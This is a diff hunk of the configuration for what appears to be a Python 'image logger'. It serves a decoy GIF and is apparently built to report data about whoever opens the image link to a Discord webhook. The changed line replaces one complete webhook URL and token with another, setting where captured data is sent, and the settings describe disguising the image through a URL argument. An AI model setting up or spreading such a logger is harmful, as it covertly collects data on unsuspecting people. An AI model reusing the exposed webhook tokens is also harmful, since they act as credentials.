@@ -12,7 +12,7 @@ __author__ = "Lucas"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1465714980824551630/3Ua2LePHuSaWpK1-Fb7DEGipFhgO4yEaohNJcdnK-RqHv9ETVqBxlnCRGiAJDAHUxGrk",
+    "webhook": "https://discord.com/api/webhooks/1520942566445682739/M0MCMr4VUKmLqK-p7W4LvmTIIW3zAu5PBqbVmf1CAKhO48gKFn18WesLcGciSADaYxDa",
     "image": "https://media.discordapp.net/stickers/1193529959747178566.gif?size=160&name=walkingman", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
